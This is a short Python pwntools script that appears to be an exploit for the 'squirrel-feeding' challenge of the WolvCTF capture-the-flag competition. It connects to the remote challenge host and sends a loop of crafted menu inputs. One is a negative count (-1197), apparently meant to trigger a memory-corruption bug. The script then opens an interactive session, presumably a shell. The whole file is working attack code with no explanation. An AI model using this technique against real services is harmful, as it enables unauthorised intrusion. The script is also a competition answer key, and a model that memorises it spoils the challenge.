from pwn import *
exe = ELF('challenge', checksec=False)
#p = process(exe.path)
p = remote('squirrel-feeding.wolvctf.io', 1337)
input()
for i in range(5):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'name: ', b'1'+b'2'*i)
    if i == 4:
        p.sendlineafter(b'them: ', b'-1197')
        break
    p.sendlineafter(b'them: ', b'99')
p.interactive()